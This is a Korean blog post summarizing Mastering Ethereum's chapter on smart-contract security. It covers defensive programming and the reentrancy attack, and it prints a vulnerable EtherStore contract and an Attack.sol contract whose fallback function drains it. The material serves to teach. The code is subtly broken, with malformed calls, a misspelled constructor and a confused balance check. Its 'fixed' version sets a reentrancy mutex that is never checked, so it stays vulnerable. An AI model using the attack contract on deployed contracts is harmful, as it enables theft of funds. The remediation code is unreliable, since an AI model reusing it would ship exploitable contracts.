---
layout:     post
title:      마스터링 이더리움 - 8
author:     bcnote3314
tags: 		blockchain Ethereum MasteringEthereum
subtitle:  블록체인 정복기	
category: Block
---

# 마스터링 이더리움 - 챕터 9-(1)

마스터링 이더리움 챕터 9 내용 요약 -1

스마트 컨트랙트 개발 과정에서 고려해야되는 보안 요소에 대한 설명이다.  
금융 거래등 신뢰성이 중요하기 때문에 개발자의 실수에 대한 대가가 크게 작용한다.  

스마트 컨트랙트를 작성하는 보안관련 사례, 패턴 등을 공부한다.

## 보안 모범 사례

### 방어적 프로그래밍(defensive programming) 
스마트 컨트랙트 작성시 가장 적합한 스타일로 다음의 몇가지 요소를 포함하는 개념이다.

1. 미니멀리즘/단순성 (minimalism/simplicity)
코드가 단순하고 적을수록 버그나 예기치 못한일의 발생 확률이 낮다.  
코드가 길다고 좋은 코드가 아니며 간단하고 심플한게 좋다. (simple is best!)

2. 코드 재사용(code reuse)
이미 존재하는 코드는 다시 만들 필요가 없다.  
필요한 것을 수행하는 라이브러리나 스마트 컨트랙트를 최대한 재사용하는 것이 좋으며 이미 알려진 코드, 광범위 하게 사용되는 코드일수록 이미 수많은 테스트를 거친것이며 새로 작성된 코드보다 안전하다.

3. 코드 품질(code quality)
스마트 컨트랙트 코드는 실수를 용납하지 않는다.  
금전적인 손실을 발생시킬수 있기 때문에 품질은 상당히 중요한 요소이며 엄격한 형태의 개발 방법론을 적용해야한다.  
블록체인의 특성상 배포된 코드를 패치하는 방법이 거의 없다.

4. 가독성/감사 용이성(readability/auditability)
코드는 명확하고 이해하기 쉬워야한다. 읽기 쉬운 코드가 감사하기도 쉽고 협업이나 타 개발자에 의한 리뷰시에 도움이 된다.  
협업/오픈소스 방법론을 사용하여 공개적으로 개발하는 것이 코드 품질에 도움이되며 명명규칙이나 문서화 등에도 신경을 쓰는것이 좋다.

5. 테스트 범위(test coverage)
가능한 모든것을 테스트 해야한다. 컨트랙트는 공개된 실행환경에서 실행되며 누구나 원하면 접근이 가능하기 때문에 함수의 입력값의 예외처리 등을 통하여 악의를 가지고 접근하는 경우를 대비해야한다.

## 보안 위험 및 안티 패턴
스마트 컨트랙트 프로그래머라면 컨트랙트를 위험에 노출시키는 패턴을 감지하고 피할수 있어야 한다.  

### 재진입성

이더리움의 특징중 하나는 다른 외부 컨트랙트 코드를 호출하고 활용할 수 있는 능력이다.  
컨트랙트는 일반적으로 이더를 처리하기 떄문에 종종 다양한 외부 사용자 주소로 이더를 전송한다.  
이때 외부에서 특정 함수를 호출하게 되는데 이런 외부의 호출은 공격자가 악용할 수 있다.  
컨트랙트에 콜백을 포함하여 대체코드를 실행하는 것을 강제할수 있다. (폴백 함수 사용)
이런 대표 사례로 DAO해킹 사례 가 있다.

관련 내용
> https://brunch.co.kr/@ashhan/26
> https://anomie7.tistory.com/56

### 취약점

이런 유형의 공격은 컨트랙트가 알 수 없는 주소로 이더를 전송할때 발생할 수 있다.  
공격자는 폴백 함수에 악성 코드를 갖고있는 컨트랙트를 외부 주소에 만들수 있고, 특정 컨트랙트에서 해당 주소로 이더를 보내면 악성 코드가 실행되는 구조이다.  

### 예제

- EtherStore.sol

```solidity

    contract EtherStore {
		uint public withdrawalLimit = 1 ether;
		mapping (address => uint) public lastWithrawTime;
    	mapping (address => uint) public balance;
    	
    	function depositFunds() public payable {
    		balance[msg.sender] += msg.value;
    	}
    	
    	function withdrawFunds (uint _weiToWithdraw) public {
    		require(balance[msg.sender] >= _weiToWithdraw);
    		require(_weiToWithdraw <= withdrawalLimit);
    		require(now >= lastWithrawTime + 1 weeks);
    		require(msg.sender.call.value(_weiToWithdraw());
    		balance[msg.sender] -= _weiToWithdraw;
    		lastWithrawTime[msg.sender] = now;
    	}
    }
```

- Attack.sol

```solidity

    import "EtherStore.sol";
    
    contract Attack {
		  EtherStore public etherStore;
      
      contructor(address _etherStoreAddress) {
			etherStore = EtherStore(_etherStoreAddress);
		}
		
		function attackEtherStore() public payable {
			require(msg.value >= 1 ether);
			etherStore.depositFunds.value(1 ether)();
			etherStore.withdrawFunds(1 ether);
		}
		
		function () payable {
			if (etherStore.balance > 1 ether) {
				etherStore.withdrawFunds(1 ether);
			}
		}
	}
```

예제 소스는 저장된 금액에서 1주일에 1Ether 씩만 뽑을수 있게 만들어진 스마트 컨트랙트를 재진입성 공격을 통하여 잔고를 털어내는 과정을 보여준다.  
간단한 예제로 외부에 contract에서 withdrawFunds 즉 출금을 시도하게 되면 EtherStore 에서 폴백함수를 수행하게 된다.

이때 폴백 함수에서 다시 withdrawFunds를 수행하게 되는데 balance나 lastWithrawTime 등의 상태값에 변경이 되기 전에 진입했기 때문에 잔액을 제외한 모든 상태 체크값이 True가 되어 1 ether(폴백 함수에 조건)를 제외한 모든 잔액을 출금하게 된다.

### 예방 기법

스마트 컨트랙트 개발 과정에서 잠재적인 재진입 취약점을 해결하기 위한 기술이 몇가지 있다.

1. 가능한 transfer함수를 이용해서 외부의 컨트랙트에 이더를 전송하는 방법
transfer 함수는 외부 호출에 대하여 가스를 2300개로 제한한다. 해당 가스의 양으로는 재진입을 하기에는 부족한 양이다.

2. 상태 변수에 대한 업데이트를 이더 전송 이전에 진행하는 방법 (애초에 잘못 짠 버그로 볼수있지...)
즉 이더를 전송하는 작업은 항상 코드 마지막에 하는것이 중요하며 이러한 패턴을 *체크 효과 상호작용 패턴* 이라고 한다.

3. mutex 사용
실행중에 컨트랙트에 lock을 걸어 재진입을 방지하는 것이다.

해당 기법들을 적용한 EtherStore.sol은 아래와 같은 형태를 보인다.

- EtherStore.sol

```solidity

    contract EtherStore {
		bool reEntrancyMutex = false;
		uint public withdrawalLimit = 1 ether;
    	mapping (address => uint) public lastWithrawTime;
    	mapping (address => uint) public balance;
    	
    	function depositFunds() public payable {
    		balance[msg.sender] += msg.value;
    	}
    	
    	function withdrawFunds (uint _weiToWithdraw) public {
    		require(balance[msg.sender] >= _weiToWithdraw);
    		require(_weiToWithdraw <= withdrawalLimit);
    		require(now >= lastWithrawTime + 1 weeks);
    		balance[msg.sender] -= _weiToWithdraw;
    		lastWithrawTime[msg.sender] = now;
			reEntrancyMutex = true;
			require(msg.sender.call.value(_weiToWithdraw());
    		reEntrancyMutex = false;
    	}
    }

```
